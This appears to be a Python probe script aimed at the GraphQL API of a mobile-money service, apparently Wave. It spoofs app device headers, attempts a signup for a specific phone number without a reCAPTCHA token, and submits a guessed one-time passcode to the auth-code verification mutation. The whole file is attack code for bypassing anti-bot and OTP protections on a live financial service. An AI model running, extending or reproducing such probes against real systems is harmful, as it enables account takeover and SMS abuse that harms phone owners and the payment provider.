import requests
import json

url = "https://ml.mmapp.wave.com/graphql"

headers = {
    "content-type": "application/json",
    "user-agent": "Wave/18.7.1 (Android; 15; Google Pixel 7)"
}

def signup_test():
    payload = {
        "operationName": "SignupMutation",
        "variables": {
            "mobile": "+22379225144",
            "device": {
                "deviceId": "461b1cafb880b09e",
                "deviceName": "Pixel 7",
                "deviceModel": "Google Pixel 7"
            },
            "ui": "SMARTPHONE_APP"
        },
        "query": "mutation SignupMutation($mobile: String, $device: DeviceInput) { signup(mobile: $mobile, device: $device) { success error } }"
    }
    
    print("[*] Attempting SignupMutation without reCAPTCHA token...")
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        print("Status Code:", response.status_code)
        print("Response:", response.text)
    except Exception as e:
        print("Error:", e)

def verify_otp_test(token_id, code):
    payload = {
        "operationName": "CustomerVerifyAuthCode",
        "variables": {
            "tokenId": token_id,
            "code": code,
            "autofilled": False,
            "insecureCurrentlyLoggedInUserSessionIds": [],
            "insecureCurrentlyLoggedInUserMobiles": []
        },
        "query": "mutation CustomerVerifyAuthCode($tokenId: String!, $code: String!, $autofilled: Boolean!) { verifyAuthCode(tokenId: $tokenId, code: $code, autofilled: $autofilled) { success } }"
    }
    
    print(f"[*] Attempting CustomerVerifyAuthCode with code {code}...")
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        print("Status Code:", response.status_code)
        print("Response:", response.text)
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    signup_test()
    verify_otp_test("ST_ml_2d571IEXlQhp", "3333")
